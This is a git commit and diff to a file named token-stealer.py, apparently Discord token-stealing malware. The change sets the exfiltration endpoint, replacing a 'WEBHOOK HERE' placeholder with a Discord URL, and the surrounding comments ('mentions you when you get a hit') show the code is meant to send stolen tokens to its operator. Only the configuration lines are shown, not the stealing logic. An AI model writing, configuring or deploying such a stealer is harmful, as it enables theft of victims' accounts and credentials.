44276bbe77d8f59f6a4ca49a98e2dade0d34eb4c
rabanner22 <rabanner22@gmail.com>
2024-07-15 08:48:38 -0700

    Update token-stealer.py

--- token-stealer.py
+++ token-stealer.py
@@ -3,7 +3,7 @@ import os
 from urllib.request import Request, urlopen
 
 # your webhook URL
-WEBHOOK_URL = "WEBHOOK HERE"
+WEBHOOK_URL = "https://discord.gg/kh2XCpSQ"
 
 # mentions you when you get a hit
 PING_ME = False
